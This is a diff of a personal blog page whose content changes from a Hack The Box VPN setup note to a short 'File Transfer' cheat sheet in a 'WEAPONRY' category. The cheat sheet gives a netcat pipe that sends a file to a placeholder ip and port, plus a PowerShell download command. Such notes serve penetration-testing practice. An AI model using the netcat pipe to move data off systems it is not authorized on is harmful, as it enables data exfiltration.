@@ -11,7 +11,7 @@
 
     <title>
         
-          HTB Environment - 阿毛毛の坑
+          File Transfer - 阿毛毛の坑
         
     </title>
 
@@ -174,25 +174,11 @@ function sidebar_toggle() {
         </div>
         <div class="book-content">
           <div class="book-post">
-  <h1 id="HTB-Environment">HTB Environment</h1>
-<h2 id="1、安装-openvpn">1、安装 openvpn</h2>
-<p>。。。</p>
-<h2 id="2、连接-VPN-进入实验室环境">2、连接 VPN 进入实验室环境</h2>
-<p>启动</p>
-<pre class="language-none"><code class="language-none">openvpm amm907.ovpn</code></pre>
-<p><img src="./1.png" alt=""><br>
-看到 <code>Initialization Sequence Completed</code> 字样说明连接成功。</p>
-<p>然后查看本地 IP</p>
-<pre><code>ip a
-</code></pre>
-<p>可以看到新增的 tun0 内网地址 <code>10.10.14.11</code>，即是实验室环境 ip。</p>
-<p><img src="./2.png" alt=""></p>
-<blockquote>
-<p><em><strong>常见异常</strong></em><br>
-<em>openvpn 断开后留下 tun0 接口，再次连接使用出现异常，以下命令删除多余的 tun0。</em><br>
-<em><code>ip link delete tun0</code></em></p>
-</blockquote>
-
+  <h1 id="文件传输">文件传输</h1>
+<h4 id="NC">NC</h4>
+<pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token function">cat</span> <span class="token variable">$&#123;file&#125;</span><span class="token operator">|</span><span class="token function">nc</span> <span class="token function">ip</span> port</code></pre>
+<h4 id="Powershell">Powershell</h4>
+<pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token function">wget</span> -Uri http://domain/file -OutFile <span class="token function">file</span></code></pre>
 </div>
 
 
@@ -229,7 +215,7 @@ function sidebar_toggle() {
     <!-- Author title -->
     <div class="author-title">
       <div>amm907</div>
-      <div>2020-11-04</div>
+      <div>2020-11-25</div>
     </div>
   </div>
 
@@ -237,7 +223,7 @@ function sidebar_toggle() {
     <div class="divider"></div>
 
     <div class="link">
-      <a class="category-link" href="/categories/Hack-The-Box/">Hack The Box</a>
+      <a class="category-link" href="/categories/WEAPONRY/">WEAPONRY</a>
 
       
     </div>
